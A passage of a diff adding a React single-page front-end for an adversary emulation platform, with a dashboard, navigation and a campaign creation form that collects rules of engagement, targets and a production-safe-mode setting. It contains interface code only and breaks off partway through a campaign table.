@@ -1,0 +1,3203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AE Platform — Adversary Emulation</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+  <style>
+    body { background:#F1F5F9; color:#1e293b; font-family:'Segoe UI',system-ui,sans-serif; margin:0; }
+
+    .sidebar-bg { background:#1E2D4A; }
+    .sidebar-active { background:rgba(255,255,255,0.18) !important; }
+    .sidebar-hover:hover { background:rgba(255,255,255,0.1); }
+
+    .card { background:#ffffff; border:1px solid #E2E8F0; border-radius:0.75rem; box-shadow:0 1px 3px rgba(0,0,0,0.06); }
+
+    .input-field {
+      width:100%; background:#F8FAFC; border:1px solid #CBD5E1; color:#1e293b;
+      border-radius:0.5rem; padding:0.5rem 0.75rem; font-size:0.875rem;
+      outline:none; transition:border-color 0.15s; box-sizing:border-box;
+    }
+    .input-field:focus { border-color:#2563eb; box-shadow:0 0 0 2px rgba(37,99,235,0.12); }
+    .input-field option { background:#ffffff; color:#1e293b; }
+    textarea.input-field { resize:vertical; min-height:72px; }
+
+    .btn-primary { background:#2563EB; color:#fff; padding:0.5rem 1.25rem; border-radius:0.5rem; font-size:0.875rem; font-weight:600; border:none; cursor:pointer; transition:all 0.15s; }
+    .btn-primary:hover { background:#1d4ed8; }
+    .btn-primary:disabled { opacity:0.5; cursor:not-allowed; }
+    .btn-secondary { background:#7C3AED; color:#fff; padding:0.5rem 1.25rem; border-radius:0.5rem; font-size:0.875rem; font-weight:600; border:none; cursor:pointer; transition:all 0.15s; }
+    .btn-secondary:hover { background:#6d28d9; }
+
+    .btn-sm { padding:0.3rem 0.75rem; font-size:0.75rem; border-radius:0.4rem; font-weight:600; cursor:pointer; border:none; transition:all 0.15s; display:inline-flex; align-items:center; gap:0.35rem; }
+    .btn-blue    { background:#2563eb; color:#fff; } .btn-blue:hover    { background:#1d4ed8; }
+    .btn-purple  { background:#7C3AED; color:#fff; } .btn-purple:hover  { background:#6d28d9; }
+    .btn-red     { background:#dc2626; color:#fff; } .btn-red:hover     { background:#b91c1c; }
+    .btn-emerald { background:#059669; color:#fff; } .btn-emerald:hover { background:#047857; }
+    .btn-amber   { background:#d97706; color:#fff; } .btn-amber:hover   { background:#b45309; }
+    .btn-ghost { background:#ffffff; color:#64748b; padding:0.4rem 0.75rem; border-radius:0.5rem; font-size:0.8rem; font-weight:500; border:1px solid #CBD5E1; cursor:pointer; transition:all 0.15s; }
+    .btn-ghost:hover { color:#1e293b; border-color:#94a3b8; background:#F1F5F9; }
+
+    .badge { display:inline-block; padding:0.15rem 0.6rem; border-radius:9999px; font-size:0.7rem; font-weight:700; letter-spacing:0.02em; }
+    .badge-draft     { background:#F1F5F9; color:#64748b; border:1px solid #CBD5E1; }
+    .badge-active    { background:#DCFCE7; color:#15803d; }
+    .badge-validating{ background:#EDE9FE; color:#6d28d9; }
+    .badge-completed { background:#DBEAFE; color:#1d4ed8; }
+    .badge-aborted   { background:#FEE2E2; color:#b91c1c; }
+    .badge-paused    { background:#FEF3C7; color:#b45309; }
+    .badge-low       { background:#DCFCE7; color:#15803d; }
+    .badge-medium    { background:#FEF3C7; color:#b45309; }
+    .badge-high      { background:#FEE2E2; color:#b91c1c; }
+    .badge-critical  { background:#F3E8FF; color:#7e22ce; }
+
+    .sigma-block { background:#0f172a; color:#4ade80; font-family:'Courier New',monospace; font-size:0.72rem; line-height:1.6; padding:0.75rem 1rem; border-radius:0.5rem; overflow-x:auto; white-space:pre; border:1px solid #1e293b; }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:#F1F5F9; }
+    ::-webkit-scrollbar-thumb { background:#CBD5E1; border-radius:3px; }
+
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .spin { animation:spin 1s linear infinite; }
+    @keyframes fadeIn { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:none; } }
+    .fade-in { animation:fadeIn 0.2s ease-in; }
+    .table-row:hover { background:rgba(37,99,235,0.03); }
+
+    .required-star { color:#ef4444; margin-left:2px; }
+    .tag-chip { display:inline-flex; align-items:center; gap:0.3rem; background:#EFF6FF; color:#2563eb; border:1px solid #BFDBFE; border-radius:9999px; padding:0.15rem 0.5rem; font-size:0.7rem; }
+  </style>
+</head>
+<body>
+<div id="root"></div>
+
+<script type="text/babel">
+const { useState, useEffect, useCallback } = React;
+
+const API = "http://localhost:8000/api/v1";
+
+async function apiFetch(path, opts = {}) {
+  // Step execution can take up to 180s (agent beacon + Shannon AI + command exec)
+  const { _timeout, ...fetchOpts } = opts;
+  const timeout = _timeout || 10000;
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), timeout);
+  const res = await fetch(`${API}${path}`, {
+    headers: { "Content-Type": "application/json", ...(fetchOpts.headers || {}) },
+    signal: controller.signal,
+    ...fetchOpts,
+  }).finally(() => clearTimeout(timer));
+  if (!res.ok) {
+    let detail = `HTTP ${res.status}`;
+    try {
+      const err = await res.json();
+      if (typeof err.detail === "string") detail = err.detail;
+      else if (Array.isArray(err.detail)) detail = err.detail.map(e => `${e.loc?.join(".")}: ${e.msg}`).join(" | ");
+    } catch {}
+    throw new Error(detail);
+  }
+  if (res.status === 204) return null;
+  return res.json();
+}
+
+// ─── Helpers ──────────────────────────────────────────────────────────────────
+function Spinner({ size = "md" }) {
+  return <div className="text-center py-6 text-blue-500"><i className={`fa-solid fa-circle-notch spin ${size === "sm" ? "text-sm" : "text-2xl"}`}></i></div>;
+}
+
+function Alert({ type = "error", msg, onClose }) {
+  if (!msg) return null;
+  const cfg = {
+    error:   { bg:"#FEF2F2", border:"#FCA5A5", icon:"fa-circle-xmark",        text:"#dc2626", textBody:"#7f1d1d" },
+    success: { bg:"#F0FDF4", border:"#86EFAC", icon:"fa-circle-check",        text:"#16a34a", textBody:"#14532d" },
+    info:    { bg:"#EFF6FF", border:"#93C5FD", icon:"fa-circle-info",         text:"#2563eb", textBody:"#1e3a8a" },
+    warn:    { bg:"#FFFBEB", border:"#FCD34D", icon:"fa-triangle-exclamation",text:"#d97706", textBody:"#78350f" },
+  }[type] || { bg:"#FEF2F2", border:"#FCA5A5", icon:"fa-circle-xmark", text:"#dc2626", textBody:"#7f1d1d" };
+  return (
+    <div className="flex items-start gap-3 rounded-lg border p-3 mb-4 text-sm" style={{background:cfg.bg,borderColor:cfg.border}}>
+      <i className={`fa-solid ${cfg.icon} mt-0.5 shrink-0`} style={{color:cfg.text}}></i>
+      <span className="flex-1" style={{color:cfg.textBody}}>{msg}</span>
+      {onClose && <button onClick={onClose} className="text-slate-400 hover:text-slate-700 ml-2"><i className="fa-solid fa-xmark"></i></button>}
+    </div>
+  );
+}
+
+function StatusBadge({ status }) {
+  return <span className={`badge badge-${status}`}>{status}</span>;
+}
+
+function Modal({ title, onClose, children, wide }) {
+  // Portal to document.body so CSS transforms on ancestor elements
+  // (e.g. the fade-in animation on the page wrapper) don't clip the overlay.
+  return ReactDOM.createPortal(
+    <div className="fixed inset-0 z-[150] overflow-y-auto" style={{background:"rgba(15,30,60,0.65)", backdropFilter:"blur(4px)"}}
+      onClick={e => e.target === e.currentTarget && onClose()}>
+      <div className="flex min-h-full items-start justify-center p-4 py-8">
+        <div className={`card shadow-2xl w-full ${wide ? "max-w-3xl" : "max-w-xl"}`} onClick={e => e.stopPropagation()}>
+          <div className="flex items-center justify-between px-5 py-4 sticky top-0" style={{borderBottom:"1px solid #E2E8F0", background:"#ffffff", borderRadius:"0.75rem 0.75rem 0 0"}}>
+            <h3 className="font-semibold text-slate-900">{title}</h3>
+            <button onClick={onClose} className="w-7 h-7 flex items-center justify-center rounded-lg text-slate-400 hover:text-slate-700 transition-all"
+              onMouseOver={e=>e.currentTarget.style.background="#F1F5F9"} onMouseOut={e=>e.currentTarget.style.background="transparent"}>
+              <i className="fa-solid fa-xmark"></i>
+            </button>
+          </div>
+          <div className="p-5">{children}</div>
+        </div>
+      </div>
+    </div>,
+    document.body
+  );
+}
+
+// ─── Confirm Dialog ────────────────────────────────────────────────────────────
+function ConfirmDialog({ title, message, confirmLabel, cancelLabel, variant, icon, onConfirm, onCancel }) {
+  const variants = {
+    danger:  { color:"#f87171", bg:"rgba(127,29,29,0.25)",   iconClass:"fa-trash-can",           btnBg:"#991b1b", btnHover:"#7f1d1d" },
+    warning: { color:"#fbbf24", bg:"rgba(120,53,15,0.25)",   iconClass:"fa-triangle-exclamation", btnBg:"#92400e", btnHover:"#78350f" },
+    info:    { color:"#60a5fa", bg:"rgba(30,58,138,0.25)",   iconClass:"fa-circle-question",      btnBg:"#1e40af", btnHover:"#1e3a8a" },
+  };
+  const cfg = variants[variant] || variants.danger;
+
+  useEffect(() => {
+    const handler = e => {
+      if (e.key === "Escape") onCancel();
+      if (e.key === "Enter")  onConfirm();
+    };
+    document.addEventListener("keydown", handler);
+    return () => document.removeEventListener("keydown", handler);
+  }, []);
+
+  return (
+    <div className="fixed inset-0 z-[300] flex items-center justify-center" style={{background:"rgba(15,30,60,0.7)", backdropFilter:"blur(4px)"}}>
+      <div className="fade-in rounded-2xl w-full max-w-sm mx-4 overflow-hidden"
+           style={{background:"#ffffff", border:"1px solid #E2E8F0", boxShadow:"0 24px 64px rgba(15,30,60,0.18)"}}>
+        {/* Icon + text */}
+        <div className="flex flex-col items-center px-7 pt-8 pb-6 text-center">
+          <div className="w-14 h-14 rounded-2xl flex items-center justify-center mb-4"
+               style={{background:cfg.bg, border:`1px solid ${cfg.color}33`}}>
+            <i className={`fa-solid ${icon || cfg.iconClass} text-xl`} style={{color:cfg.color}}></i>
+          </div>
+          <h3 className="text-base font-bold text-slate-900 mb-2">{title}</h3>
+          <p className="text-sm text-slate-500 leading-relaxed whitespace-pre-line">{message}</p>
+        </div>
+        {/* Divider */}
+        <div style={{height:"1px", background:"#E2E8F0"}}></div>
+        {/* Buttons */}
+        <div className="flex gap-3 px-5 py-4">
+          <button className="flex-1 btn-ghost" onClick={onCancel}>{cancelLabel || "Batal"}</button>
+          <button
+            className="flex-1 rounded-lg py-2 px-4 text-sm font-semibold text-white transition-all"
+            style={{background:cfg.btnBg}}
+            onMouseOver={e => e.currentTarget.style.background = cfg.btnHover}
+            onMouseOut={e  => e.currentTarget.style.background = cfg.btnBg}
+            onClick={onConfirm}>
+            {confirmLabel || "Ya, Lanjutkan"}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function useConfirm() {
+  const [dialog, setDialog] = useState(null);
+
+  function showConfirm(opts) {
+    return new Promise(resolve => setDialog({ ...opts, resolve }));
+  }
+
+  function handleClose(result) {
+    if (dialog) { dialog.resolve(result); setDialog(null); }
+  }
+
+  const ConfirmNode = dialog ? ReactDOM.createPortal(
+    <ConfirmDialog
+      title={dialog.title}
+      message={dialog.message}
+      confirmLabel={dialog.confirmLabel}
+      cancelLabel={dialog.cancelLabel}
+      variant={dialog.variant || "danger"}
+      icon={dialog.icon}
+      onConfirm={() => handleClose(true)}
+      onCancel={() => handleClose(false)}
+    />,
+    document.body
+  ) : null;
+
+  return [showConfirm, ConfirmNode];
+}
+
+function FormField({ label, required, children, hint }) {
+  return (
+    <div className="space-y-1.5">
+      <label className="text-xs font-semibold text-slate-600 uppercase tracking-wider">
+        {label}{required && <span className="required-star">*</span>}
+      </label>
+      {children}
+      {hint && <p className="text-xs text-slate-500">{hint}</p>}
+    </div>
+  );
+}
+
+// Parse text → array (split by comma, newline, space)
+function parseList(text) {
+  return text.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
+}
+
+// Simple textarea list input — parse on blur/change, no chip UX needed
+function ListTextarea({ value, onChange, placeholder, rows = 3 }) {
+  // Convert array → display string (newline-separated) only on first render
+  const [text, setText] = useState(value.join("\n"));
+  // Sync outward whenever text changes
+  function handleChange(e) {
+    const v = e.target.value;
+    setText(v);
+    onChange(parseList(v));
+  }
+  return (
+    <div className="space-y-1">
+      <textarea className="input-field" rows={rows} value={text} onChange={handleChange} placeholder={placeholder}
+        style={{resize:"vertical", minHeight:`${rows * 1.6}rem`}} />
+      {value.length > 0 && (
+        <div className="flex flex-wrap gap-1">
+          {value.map((v, i) => <span key={i} className="tag-chip">{v}</span>)}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Color map for StatCard ───────────────────────────────────────────────────
+const STAT_COLORS = {
+  blue:    { bg:"#EFF6FF", border:"#BFDBFE", iconBg:"#DBEAFE", iconText:"#2563eb", sub:"#3b82f6" },
+  purple:  { bg:"#F5F3FF", border:"#DDD6FE", iconBg:"#EDE9FE", iconText:"#7C3AED", sub:"#8b5cf6" },
+  emerald: { bg:"#F0FDF4", border:"#BBF7D0", iconBg:"#DCFCE7", iconText:"#16a34a", sub:"#059669" },
+  pink:    { bg:"#FDF2F8", border:"#FBCFE8", iconBg:"#FCE7F3", iconText:"#db2777", sub:"#ec4899" },
+  amber:   { bg:"#FFFBEB", border:"#FDE68A", iconBg:"#FEF3C7", iconText:"#d97706", sub:"#f59e0b" },
+  red:     { bg:"#FEF2F2", border:"#FECACA", iconBg:"#FEE2E2", iconText:"#dc2626", sub:"#ef4444" },
+};
+
+function StatCard({ icon, color = "blue", title, value, sub, onClick }) {
+  const c = STAT_COLORS[color] || STAT_COLORS.blue;
+  return (
+    <div onClick={onClick} className="rounded-xl p-5 flex items-start gap-4 transition-all"
+      style={{background:c.bg, border:`1px solid ${c.border}`, cursor:onClick?"pointer":"default", boxShadow:"0 1px 3px rgba(0,0,0,0.05)"}}
+      onMouseOver={e => onClick && (e.currentTarget.style.boxShadow="0 4px 12px rgba(0,0,0,0.1)")}
+      onMouseOut={e => onClick && (e.currentTarget.style.boxShadow="0 1px 3px rgba(0,0,0,0.05)")}>
+      <div className="w-10 h-10 rounded-lg flex items-center justify-center shrink-0" style={{background:c.iconBg}}>
+        <i className={`fa-solid ${icon}`} style={{color:c.iconText}}></i>
+      </div>
+      <div className="flex-1 min-w-0">
+        <div className="text-xs text-slate-500 font-medium uppercase tracking-wider mb-0.5">{title}</div>
+        <div className="text-2xl font-bold text-slate-900">{value ?? <span className="text-slate-400 text-lg">—</span>}</div>
+        <div className="text-xs mt-0.5" style={{color:c.sub}}>{sub}</div>
+      </div>
+    </div>
+  );
+}
+
+// ─── Navigation ───────────────────────────────────────────────────────────────
+const NAV = [
+  { id:"dashboard",   label:"Dashboard",       icon:"fa-gauge-high" },
+  { id:"campaigns",   label:"Campaigns",        icon:"fa-crosshairs" },
+  { id:"techniques",  label:"Techniques",       icon:"fa-book-open" },
+  { id:"aptprofiles", label:"APT Profiles",     icon:"fa-user-secret" },
+  { id:"agents",      label:"Agents",           icon:"fa-robot" },
+  { id:"purple",      label:"Purple Team",      icon:"fa-shield-halved" },
+  { id:"reports",     label:"Reports & STIX",   icon:"fa-file-export" },
+];
+
+function Sidebar({ page, setPage }) {
+  return (
+    <aside className="sidebar-bg w-56 flex flex-col shrink-0" style={{borderRight:"1px solid rgba(255,255,255,0.1)"}}>
+      <div className="px-4 py-5 flex items-center gap-3" style={{borderBottom:"1px solid rgba(255,255,255,0.1)"}}>
+        <div className="w-9 h-9 rounded-lg flex items-center justify-center shrink-0" style={{background:"rgba(255,255,255,0.15)"}}>
+          <i className="fa-solid fa-crosshairs text-white text-base"></i>
+        </div>
+        <div>
+          <div className="text-sm font-bold text-white">AE Platform</div>
+          <div className="text-xs opacity-60" style={{color:"#c4b5fd"}}>Adversary Emulation</div>
+        </div>
+      </div>
+      <nav className="flex-1 p-3 space-y-0.5 overflow-y-auto">
+        {NAV.map(n => (
+          <button key={n.id} onClick={() => setPage(n.id)}
+            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all text-left sidebar-hover ${page === n.id ? "sidebar-active text-white" : "text-purple-200 opacity-80"}`}>
+            <i className={`fa-solid ${n.icon} w-4 text-center text-sm`}></i>
+            {n.label}
+          </button>
+        ))}
+      </nav>
+      <div className="p-3" style={{borderTop:"1px solid rgba(255,255,255,0.1)"}}>
+        <a href="http://localhost:8000/docs" target="_blank"
+          className="flex items-center gap-2 text-xs sidebar-hover transition-all px-3 py-2 rounded-lg"
+          style={{color:"rgba(196,181,253,0.6)"}}>
+          <i className="fa-solid fa-terminal text-xs"></i>Swagger API Docs
+        </a>
+      </div>
+    </aside>
+  );
+}
+
+function Topbar({ page, online }) {
+  const TITLES = { dashboard:"Dashboard", campaigns:"Campaigns", techniques:"Technique Library", aptprofiles:"APT Profiles", agents:"Agent Framework", purple:"Purple Team", reports:"Reports & STIX Export" };
+  return (
+    <header className="h-14 px-6 flex items-center justify-between shrink-0" style={{background:"#ffffff", borderBottom:"1px solid #E2E8F0", boxShadow:"0 1px 3px rgba(0,0,0,0.05)"}}>
+      <div className="flex items-center gap-2">
+        <i className="fa-solid fa-crosshairs text-xs" style={{color:"#2563eb"}}></i>
+        <span className="text-xs text-slate-400">AE Platform</span>
+        <i className="fa-solid fa-chevron-right text-slate-300 text-xs"></i>
+        <span className="text-sm font-semibold text-slate-900">{TITLES[page] || page}</span>
+      </div>
+      <div className={`flex items-center gap-2 text-xs px-3 py-1.5 rounded-full border font-medium`}
+        style={online===true?{background:"#F0FDF4",color:"#16a34a",borderColor:"#86EFAC"}:online===false?{background:"#FEF2F2",color:"#dc2626",borderColor:"#FCA5A5"}:{background:"#F8FAFC",color:"#64748b",borderColor:"#CBD5E1"}}>
+        <span className="w-1.5 h-1.5 rounded-full" style={{background:online===true?"#22c55e":online===false?"#ef4444":"#94a3b8", animation:online===true?"pulse 2s infinite":""}}></span>
+        {online===true?"API Online":online===false?"API Offline":"Connecting…"}
+      </div>
+    </header>
+  );
+}
+
+// ─── App Root ─────────────────────────────────────────────────────────────────
+function App() {
+  const [page, setPage] = useState("dashboard");
+  const [pageParams, setPageParams] = useState({});
+  const [online, setOnline] = useState(null);
+
+  useEffect(() => {
+    apiFetch("/health").then(() => setOnline(true)).catch(() => setOnline(false));
+  }, []);
+
+  function navigate(p, params = {}) { setPage(p); setPageParams(params); }
+  function navTo(p) { setPage(p); setPageParams({}); }
+
+  return (
+    <div className="flex h-screen overflow-hidden">
+      <Sidebar page={page} setPage={navTo} />
+      <div className="flex-1 flex flex-col overflow-hidden">
+        <Topbar page={page} online={online} />
+        <main className="flex-1 overflow-y-auto" style={{background:"#F1F5F9"}}>
+          <div className="p-6 w-full fade-in">
+            {page === "dashboard"      && <Dashboard navigate={navigate} />}
+            {page === "campaigns"      && <Campaigns navigate={navigate} />}
+            {page === "campaign-detail"&& <CampaignDetail id={pageParams.id} navigate={navigate} />}
+            {page === "techniques"     && <Techniques />}
+            {page === "aptprofiles"    && <AptProfiles />}
+            {page === "agents"         && <Agents />}
+            {page === "purple"         && <PurpleTeam navigate={navigate} />}
+            {page === "purple-detail"  && <PurpleDetail id={pageParams.id} navigate={navigate} />}
+            {page === "reports"        && <Reports />}
+          </div>
+        </main>
+      </div>
+    </div>
+  );
+}
+
+// ─── Dashboard ────────────────────────────────────────────────────────────────
+function Dashboard({ navigate }) {
+  const [stats, setStats] = useState(null);
+
+  useEffect(() => {
+    Promise.all([
+      apiFetch("/campaigns/").catch(() => []),
+      apiFetch("/agents/").catch(() => []),
+      apiFetch("/purple/sessions").catch(() => []),
+      apiFetch("/apt-profiles/").catch(() => []),
+    ]).then(([campaigns, agents, sessions, profiles]) => setStats({ campaigns, agents, sessions, profiles }));
+  }, []);
+
+  if (!stats) return <Spinner />;
+  const { campaigns, agents, sessions, profiles } = stats;
+  const activeCamps  = campaigns.filter(c => c.status === "active").length;
+  const activeAgents = agents.filter(a => a.status === "active").length;
+  const totalGaps    = sessions.reduce((s, p) => s + (p.gap_count || 0), 0);
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h1 className="text-xl font-bold text-slate-900">Dashboard</h1>
+        <p className="text-sm text-slate-500 mt-1">AI-Powered Adversary Emulation — ICS/OT + Enterprise IT</p>
+      </div>
+      <div className="grid grid-cols-2 xl:grid-cols-4 gap-4">
+        <StatCard icon="fa-crosshairs"    color="blue"    title="Campaigns"      value={campaigns.length} sub={`${activeCamps} active`}             onClick={() => navigate("campaigns")} />
+        <StatCard icon="fa-user-secret"   color="purple"  title="APT Profiles"   value={profiles.length}  sub="Threat actor profiles"               onClick={() => navigate("aptprofiles")} />
+        <StatCard icon="fa-robot"         color="emerald" title="Active Agents"  value={activeAgents}     sub={`${agents.length} registered`}        onClick={() => navigate("agents")} />
+        <StatCard icon="fa-shield-halved" color="pink"    title="Detection Gaps" value={totalGaps}        sub={`${sessions.length} purple sessions`}  onClick={() => navigate("purple")} />
+      </div>
+      <div className="grid grid-cols-3 gap-4">
+        <div className="col-span-2 card p-5">
+          <p className="text-xs font-semibold text-slate-500 uppercase tracking-wider mb-4">Quick Actions</p>
+          <div className="grid grid-cols-3 gap-3">
+            {[
+              { icon:"fa-plus",          label:"New Campaign",       bg:"#2563EB", page:"campaigns" },
+              { icon:"fa-shield-halved", label:"Purple Session",     bg:"#0e7490", page:"purple" },
+              { icon:"fa-file-export",   label:"Reports & STIX",    bg:"#047857", page:"reports" },
+            ].map(a => (
+              <button key={a.page} onClick={() => navigate(a.page)}
+                className="rounded-xl p-5 flex flex-col items-center gap-2 text-sm font-semibold text-white transition-all hover:brightness-125"
+                style={{background:a.bg}}>
+                <i className={`fa-solid ${a.icon} text-2xl`}></i>
+                {a.label}
+              </button>
+            ))}
+          </div>
+        </div>
+        <div className="card p-5">
+          <p className="text-xs font-semibold text-slate-500 uppercase tracking-wider mb-4">Recent Campaigns</p>
+          {campaigns.length === 0 ? (
+            <p className="text-center text-slate-600 text-sm py-4">No campaigns yet</p>
+          ) : campaigns.slice(0, 5).map(c => (
+            <button key={c.id} onClick={() => navigate("campaign-detail", { id: c.id })}
+              className="w-full flex items-center justify-between px-3 py-2 rounded-lg hover:bg-slate-50 transition-all text-left">
+              <div className="min-w-0">
+                <div className="text-sm text-slate-900 font-medium truncate">{c.name}</div>
+                <div className="text-xs text-slate-500 truncate">{c.client_name}</div>
+              </div>
+              <StatusBadge status={c.status} />
+            </button>
+          ))}
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── Campaigns ────────────────────────────────────────────────────────────────
+function Campaigns({ navigate }) {
+  const [campaigns, setCampaigns] = useState(null);
+  const [showForm, setShowForm] = useState(false);
+  const [aptProfiles, setAptProfiles] = useState([]);
+  const [err, setErr] = useState("");
+  const [saving, setSaving] = useState(false);
+  const [deleting, setDeleting] = useState(null);
+  const [showConfirm, ConfirmNode] = useConfirm();
+
+  // Form state — matches CampaignCreate schema exactly
+  const initForm = { name:"", description:"", client_name:"", engagement_type:"blackbox",
+    environment_type:"it", target_ips:[], target_domains:[], excluded_targets:[],
+    rules_of_engagement:"", emergency_contact:"", objectives:[], production_safe_mode:true, apt_profile_id:"" };
+  const [form, setForm] = useState(initForm);
+
+  const load = useCallback(() => {
+    apiFetch("/campaigns/").then(setCampaigns).catch(e => { setErr(e.message); setCampaigns([]); });
+    apiFetch("/apt-profiles/").then(setAptProfiles).catch(() => {});
+  }, []);
+  useEffect(() => { load(); }, [load]);
+
+  function set(k, v) { setForm(f => ({ ...f, [k]: v })); }
+
+  async function create(e) {
+    e.preventDefault(); setErr(""); setSaving(true);
+    try {
+      const body = { ...form };
+      if (!body.apt_profile_id) delete body.apt_profile_id;
+      await apiFetch("/campaigns/", { method:"POST", body:JSON.stringify(body) });
+      setShowForm(false); setForm(initForm); load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setSaving(false); }
+  }
+
+  async function deleteCampaign(e, c) {
+    e.stopPropagation();
+    const ok = await showConfirm({
+      title: "Hapus Campaign",
+      message: `Campaign "${c.name}" beserta semua steps, executions, dan findings-nya akan dihapus permanen.`,
+      confirmLabel: "Ya, Hapus",
+      variant: "danger",
+    });
+    if (!ok) return;
+    setDeleting(c.id);
+    try {
+      await apiFetch(`/campaigns/${c.id}`, { method:"DELETE" });
+      load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setDeleting(null); }
+  }
+
+  return (
+    <div className="space-y-5">
+      {ConfirmNode}
+      <div className="flex items-center justify-between">
+        <div>
+          <h1 className="text-xl font-bold text-slate-900">Campaigns</h1>
+          <p className="text-sm text-slate-500 mt-1">Manage adversary emulation engagements</p>
+        </div>
+        <button className="btn-primary" onClick={() => { setErr(""); setShowForm(true); }}>
+          <i className="fa-solid fa-plus mr-2"></i>New Campaign
+        </button>
+      </div>
+
+      <Alert msg={err} onClose={() => setErr("")} />
+
+      {showForm && (
+        <Modal title="Create New Campaign" onClose={() => setShowForm(false)} wide>
+          <form onSubmit={create} className="space-y-4">
+            <Alert msg={err} onClose={() => setErr("")} />
+
+            <div className="grid grid-cols-2 gap-3">
+              <FormField label="Campaign Name" required>
+                <input className="input-field" required value={form.name} onChange={e => set("name", e.target.value)} placeholder="Operation Blackout 2025" />
+              </FormField>
+              <FormField label="Client Name" required>
+                <input className="input-field" required value={form.client_name} onChange={e => set("client_name", e.target.value)} placeholder="ACME Corp" />
+              </FormField>
+            </div>
+
+            <div className="grid grid-cols-3 gap-3">
+              <FormField label="Engagement Type" required>
+                {/* Literal: blackbox | greybox | whitebox */}
+                <select className="input-field" value={form.engagement_type} onChange={e => set("engagement_type", e.target.value)}>
+                  <option value="blackbox">Blackbox</option>
+                  <option value="greybox">Greybox</option>
+                  <option value="whitebox">Whitebox</option>
+                </select>
+              </FormField>
+              <FormField label="Environment" required>
+                <select className="input-field" value={form.environment_type} onChange={e => set("environment_type", e.target.value)}>
+                  <option value="it">Enterprise IT</option>
+                  <option value="ot">OT/ICS</option>
+                  <option value="hybrid">Hybrid</option>
+                  <option value="cloud">Cloud</option>
+                  <option value="hybrid_it_ot">Hybrid IT+OT</option>
+                </select>
+              </FormField>
+              <FormField label="APT Profile">
+                <select className="input-field" value={form.apt_profile_id} onChange={e => set("apt_profile_id", e.target.value)}>
+                  <option value="">— None —</option>
+                  {aptProfiles.map(p => <option key={p.id} value={p.id}>{p.name}</option>)}
+                </select>
+              </FormField>
+            </div>
+
+            <FormField label="Rules of Engagement" required hint="Wajib diisi — contoh: No production systems, testing hours 09:00–17:00, no DoS">
+              <textarea className="input-field" required value={form.rules_of_engagement}
+                onChange={e => set("rules_of_engagement", e.target.value)}
+                placeholder="e.g. No production disruption. Test window: Mon–Fri 09:00–17:00 WIB. No exfiltration of real data." />
+            </FormField>
+
+            <FormField label="Target IPs" required hint="Minimal satu IP atau domain wajib diisi. Tulis satu per baris atau pisahkan dengan koma.">
+              <ListTextarea value={form.target_ips} onChange={v => set("target_ips", v)}
+                placeholder={"10.0.0.1\n192.168.1.0/24\n10.10.5.0/24"} rows={3} />
+            </FormField>
+
+            <FormField label="Target Domains" hint="Opsional — satu per baris atau pisahkan koma.">
+              <ListTextarea value={form.target_domains} onChange={v => set("target_domains", v)}
+                placeholder={"acme.internal\n*.corp.local"} rows={2} />
+            </FormField>
+
+            <div className="grid grid-cols-2 gap-3">
+              <FormField label="Emergency Contact">
+                <input className="input-field" value={form.emergency_contact} onChange={e => set("emergency_contact", e.target.value)} placeholder="+62 812 0000 0000" />
+              </FormField>
+              <FormField label="Description">
+                <input className="input-field" value={form.description} onChange={e => set("description", e.target.value)} placeholder="Campaign objectives…" />
+              </FormField>
+            </div>
+
+            <div className="flex items-center gap-3">
+              <input type="checkbox" id="psm" checked={form.production_safe_mode} onChange={e => set("production_safe_mode", e.target.checked)} className="w-4 h-4 accent-purple-500" />
+              <label htmlFor="psm" className="text-sm text-slate-700">Production Safe Mode (recommended)</label>
+            </div>
+
+            <div className="flex justify-end gap-3 pt-2">
+              <button type="button" className="btn-secondary" onClick={() => setShowForm(false)}>Cancel</button>
+              <button type="submit" className="btn-primary" disabled={saving}>
+                {saving ? <><i className="fa-solid fa-circle-notch spin mr-2"></i>Creating…</> : "Create Campaign"}
+              </button>
+            </div>
+          </form>
+        </Modal>
+      )}
+
+      {campaigns === null ? <Spinner /> : campaigns.length === 0 ? (
+        <div className="card p-16 text-center">
+          <i className="fa-solid fa-crosshairs text-4xl text-slate-700 mb-4 block"></i>
+          <p className="text-slate-400 font-medium">No campaigns yet</p>
+          <button className="btn-primary mt-4" onClick={() => setShowForm(true)}>Create Campaign</button>
+        </div>
+      ) : (
+        <div className="card overflow-hidden">
+          <table className="w-full text-sm">
+            <thead>
+              <tr style={{background:"#F8FAFC", borderBottom:"1px solid #E2E8F0"}}>
+                {["Campaign","Client","Type","Environment","Status",""].map(h => (
+                  <th key={h} className="text-left px-4 py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">{h}</th>
+                ))}
+              </tr>
+            </thead>
+            <tbody className="divide-y" style={{borderColor:"#E2E8F0"}}>
+              {campaigns.map(c => (
+                <tr key={c.id} className="table-row cursor-pointer" onClick={() => navigate("campaign-detail", { id: c.id })}>
+                  <td className="px-4 py-3">
+                    <div className="font-medium text-slate-900">{c.name}</div>
+                    <div className="text-xs text-slate-400 mt-0.5">{c.description || "—"}</div>
+                  </td>
+                  <td className="px-4 py-3 text-slate-600">{c.client_name}</td>
+                  <td className="px-4 py-3 text-slate-600">{c.engagement_type}</td>
+                  <td className="px-4 py-3 text-slate-600">{c.environment_type?.toUpperCase()}</td>
+                  <td className="px-4 py-3"><StatusBadge status={c.status} /></td>
